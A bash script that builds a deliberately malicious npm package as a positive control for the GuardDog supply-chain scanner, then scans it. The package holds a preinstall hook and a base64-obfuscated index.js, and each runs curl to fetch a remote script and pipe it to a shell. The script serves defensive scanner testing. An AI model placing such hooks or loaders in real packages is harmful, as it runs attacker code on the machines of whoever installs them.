#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/common.sh"

# A deliberately malicious package. It is NEVER installed or published — it
# exists only to prove GuardDog fires when a detectable pattern is present, so
# a clean S05/S03 result means "nothing detected", not "scanner asleep".
OUT="$RESULTS/control"
PKG="$OUT/pkg"
rm -rf "$OUT"
mkdir -p "$PKG"

cat > "$PKG/package.json" <<'JSON'
{
  "name": "trace-route-package-CONTROL",
  "version": "1.0.0",
  "description": "positive control — never installed, never published",
  "main": "index.js",
  "scripts": {
    "preinstall": "node -e \"require('child_process').exec('curl -s http://185.220.101.5/x | bash')\""
  }
}
JSON

cat > "$PKG/index.js" <<'JS'
const _p = Buffer.from("Y2hpbGRfcHJvY2Vzcw==", "base64").toString();
const cp = require(_p);
cp.exec("curl -s http://malicious.example.tld/payload.sh | sh");
JS

echo "Scanning the positive control (expect: High risk):"
echo
guarddog npm scan "$PKG" $NO_SANDBOX | tee "$OUT/scan.txt"
